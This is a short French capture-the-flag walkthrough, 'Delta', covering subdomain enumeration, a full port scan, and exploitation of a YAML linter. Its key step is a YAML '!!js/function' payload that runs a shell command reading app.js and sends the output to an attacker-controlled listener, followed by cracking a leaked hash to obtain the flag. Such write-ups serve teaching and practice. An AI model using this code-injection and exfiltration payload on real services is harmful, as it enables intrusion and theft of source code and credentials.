# Delta

1) Chercher les sous domaines avec gobuster

```bash
gobuster dns -d rs.io -w hacker-toolkit/wordlists/common_subdomains.txt
```

2) Trouver le sous domaine `delta.rs.io`

3) Scan de port avec nmap sur le sous domaine

```bash
nmap -sV -p- delta.rs.io
```

4) On trouve le port 3928

5) On ouvre un navigateur sur le port 3928 et on trouve un site web

6) On y trouve un formulaire permettant de linter du code yaml

7) En analysant les requetes faites, on trouve une vulnérabilité de type `Arbitrary Code Execution`

8) On y injecte le code suivant:

```yaml
a: !!js/function >
  (function(){ Promise.all([import("http"), import("child_process")]).then(([http, child_process]) => http.get(`http://192.168.30.1:9001/${child_process.execSync("cat app.js")}`)); })();
```

9) On lance un serveur sur le port 9001

```bash
nc -lnvp 9001
```

10) Dans ce qui est retourné, on trouve un mot de passe hashé `3237c2f731b3c52f29df65672251d9702a7cdc0daad038696e4912d114ba66dc626daca8db0517421c8975ee3ca4d47398a7cada5344ba08df6422a372b500c0`

11) On le crack avec le site hashtoolkit.com

12) On trouve le mot de passe `carver2059`

### Flag = carver2059